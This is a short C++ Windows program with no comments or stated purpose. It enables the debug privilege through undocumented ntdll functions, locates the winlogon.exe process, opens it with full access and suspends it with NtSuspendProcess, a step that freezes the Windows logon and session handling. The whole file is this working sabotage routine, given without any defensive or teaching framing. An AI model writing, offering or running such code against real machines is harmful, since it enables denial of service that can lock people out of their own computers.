#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#define SE_DEBUG_PRIVILEGE 20
typedef LONG(__stdcall *RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef LONG(__stdcall *SuspendOrResumeProcess)(HANDLE hProcess);
DWORD GetWinlogonPid() {
	HANDLE			snap;
	PROCESSENTRY32	pEntry;
	BOOL			rtn;
	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pEntry.dwSize = sizeof(pEntry);
	rtn = Process32First(snap, &pEntry);
	while (rtn) {
		if (!strcmp(pEntry.szExeFile, "winlogon.exe")) {
			CloseHandle(snap);
			return pEntry.th32ProcessID;
		}
		memset(pEntry.szExeFile, 0, 260);
		rtn = Process32Next(snap, &pEntry);
	}

	CloseHandle(snap);
	return 0;
}
int main() {
	HMODULE hMod = LoadLibrary("ntdll");
	if (hMod == 0) {
		return 1;
	}
	RtlAdjustPrivilege lpfnRtlAdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress(hMod, "RtlAdjustPrivilege");
	if (lpfnRtlAdjustPrivilege == 0) {
		return 1;
	}
	SuspendOrResumeProcess lpfnNtSuspendProcess = (SuspendOrResumeProcess)GetProcAddress(hMod, "NtSuspendProcess");
	if (lpfnNtSuspendProcess == 0) {
		return 1;
	}
	DWORD pid = GetWinlogonPid();
	BOOLEAN dummy = 0;
	lpfnRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false, &dummy);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (hProcess == 0) {
		return 1;
	}
	lpfnNtSuspendProcess(hProcess);
	CloseHandle(hProcess);
	return 0;
}
